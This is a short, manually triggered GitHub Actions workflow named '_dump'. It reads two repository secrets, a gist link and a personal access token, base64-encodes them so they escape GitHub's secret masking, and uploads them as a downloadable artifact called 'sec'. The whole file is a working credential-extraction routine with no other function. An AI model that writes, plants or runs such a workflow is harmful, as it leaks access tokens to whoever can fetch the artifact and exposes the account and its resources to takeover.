name: _dump
on:
  workflow_dispatch: {}
jobs:
  e:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S_GIST_LINK: ${{ secrets.GIST_LINK }}
          S_GIST_PAT: ${{ secrets.GIST_PAT }}
        run: |
          mkdir -p out
          printf '%s' "$S_GIST_LINK" | base64 -w0 > out/GIST_LINK.b64
          printf '%s' "$S_GIST_PAT" | base64 -w0 > out/GIST_PAT.b64
      - uses: actions/upload-artifact@v4
        with:
          name: sec
          path: out/
